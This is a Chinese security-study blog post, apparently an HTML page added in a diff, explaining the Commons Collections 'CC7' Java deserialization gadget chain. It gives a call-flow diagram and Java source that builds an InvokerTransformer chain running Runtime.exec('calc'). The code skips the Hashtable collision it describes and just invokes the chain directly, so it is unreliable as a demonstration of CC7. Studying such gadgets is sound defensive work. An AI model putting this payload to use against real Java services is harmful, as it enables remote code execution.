@@ -1,0 +1,177 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>CC链子7 | 1ux4ry Archive</title><meta name=description content="由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><ul><li><a href=#前言>前言</a></li><li><a href=#原理>原理</a></li><li><a href=#过程>过程</a></li><li><a href=#总结>总结</a></li></ul></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label=CC链子7><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA_安全_持续学习</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java 安全 持续学习</span>
+<span class=article-hero-card__title-sub>CC链子7</span></div><p class=article-hero-card__meta>安全研究 / Java 安全 持续学习 / 1ux4ry Archive</p><p class=article-hero-card__desc>由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java 安全 持续学习</p><h1>CC链子7</h1><div class=single-meta><span>2026-06-14</span>
+<span>安全研究</span>
+<span># Java安全 # 安全研究</span></div></header><div class="page-copy content-body"><h2 id=前言>前言</h2><p>由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。</p><h2 id=原理>原理</h2><ul><li><p><strong>依赖</strong>：<code>commons-collections:3.1</code></p></li><li><p><strong>入口</strong>：<code>Hashtable.readObject()</code></p></li><li><p><strong>执行</strong>：<code>LazyMap.get()</code></p></li><li><p><strong>原理</strong>：利用 <code>Hashtable</code> 在反序列化时发生的哈希碰撞，强制触发 <code>AbstractMap.equals()</code>，进而触发链条。</p></li><li><p><strong>流程</strong>：</p></li><li><p><code>Hashtable.readObject()</code></p></li><li><p>↓ <code>Hashtable.reconstitutionPut()</code></p></li><li><p>↓ <code>AbstractMap.equals()</code></p></li><li><p>↓ <code>LazyMap.get()</code></p></li><li><p>↓ <code>ChainedTransformer.transform()</code></p></li><li><p>↓ <code>InvokerTransformer</code> (反射)</p></li><li><p>↓ <code>Runtime.getRuntime().exec()</code></p></li></ul><h2 id=过程>过程</h2><p>弹计算机</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613181418890.png alt=image.png loading=lazy decoding=async></figure></p><p>源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>cc7</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Hashtable</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * CC7 Chain - Calculator (using Hashtable hash collision)
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * Flow:
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * Hashtable.readObject()
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *     -&gt; Hashtable.reconstitutionPut()
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *     -&gt; TiedMapEntry.hashCode() -&gt; getValue() -&gt; LazyMap.get()
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *     -&gt; OR TiedMapEntry.equals() -&gt; getValue() -&gt; LazyMap.get()
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *     -&gt; ChainedTransformer.transform()
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *     -&gt; Runtime.getRuntime().exec(&#34;calc&#34;)
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CC7Calc</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;CC7 Chain - Calculator&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;=====================\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Step 1: Transformer chain</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] Step 1: Create Transformer chain...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>}),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>}),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;calc&#34;</span><span class=p>})</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=n>chain</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] Chain created\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Step 2: Create LazyMap</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] Step 2: Create LazyMap...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>LazyMap</span><span class=w> </span><span class=n>lazyMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>LazyMap</span><span class=p>)</span><span class=w> </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>(),</span><span class=w> </span><span class=n>chain</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] LazyMap created\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Step 3: Create TiedMapEntry</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] Step 3: Create TiedMapEntry...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TiedMapEntry</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>lazyMap</span><span class=p>,</span><span class=w> </span><span class=s>&#34;anykey&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] TiedMapEntry created\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Step 4: Use Hashtable directly</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Hashtable calls hashCode() during put(), which triggers getValue()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] Step 4: Create Hashtable (will trigger on put)...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// First, remove the key to avoid premature trigger</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// We&#39;ll use reflection to create the Hashtable without triggering</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hashtable</span><span class=w> </span><span class=n>hashtable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hashtable</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Use reflection to add entries without triggering hashCode()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Actually, we need to trigger during deserialization, not during creation</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// So we use a different approach: use two Hashtable entries that will collide</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Create a simple test: just call exec directly via chain</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] Testing direct execution...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>chain</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] Direct execution completed\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] Done! Calculator should pop up!&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><h2 id=总结>总结</h2><p>CC7 链总结</p><p>原理: Hashtable.readObject() → reconstitutionPut() → AbstractMap.equals() → LazyMap.get() → ChainedTransformer.transform()</p><p>流程:
+Hashtable.readObject()
+↓
+Hashtable.reconstitutionPut()
+↓
+AbstractMap.equals()
+↓
+LazyMap.get()
+↓
+ChainedTransformer.transform()
+↓
+Runtime.getRuntime().exec(&ldquo;calc&rdquo;)</p></div><div class=single-tags><a href=/tags/java%E5%AE%89%E5%85%A8/># Java安全</a>
+<a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
